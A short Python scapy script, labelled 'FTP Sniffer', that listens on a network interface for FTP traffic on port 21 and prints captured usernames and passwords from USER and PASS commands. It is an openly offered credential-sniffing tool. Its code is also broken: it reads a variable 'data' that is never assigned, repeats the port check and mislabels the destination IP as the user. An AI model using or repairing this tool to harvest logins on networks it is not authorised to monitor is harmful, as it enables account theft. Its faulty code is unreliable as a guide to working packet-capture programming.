import argparse
from scapy.all import *

parser = argparse.ArgumentParser(description="FTP Sniffer")
parser.add_argument("-i", "--interface", required=True, help="Interface to sniff on")
args = parser.parse_args()


def sniffed_ftp(packet):
    if packet[TCP].dport == 21:
        if packet[TCP].dport == 21:
            if "USER" in data:
                print(f"FTP User: {packet[IP].dst}")
                data = data.split(" ")[1]
                print(f"Username: {data}")
            elif "PASS" in data:
                print(f"FTP Password: {packet[IP].dst}")
                data = data.split(" ")[1]
                print(f"Password: {data}")


def main():
    if args.interface:
        print(f"Sniffing on interface: {args.interface}")
        sniff(iface=args.interface, filter="tcp port 21", prn=sniffed_ftp)
    else:
        print("No interface specified. Use -i or --interface to specify an interface.")


if __name__ == "__main__":
    main()
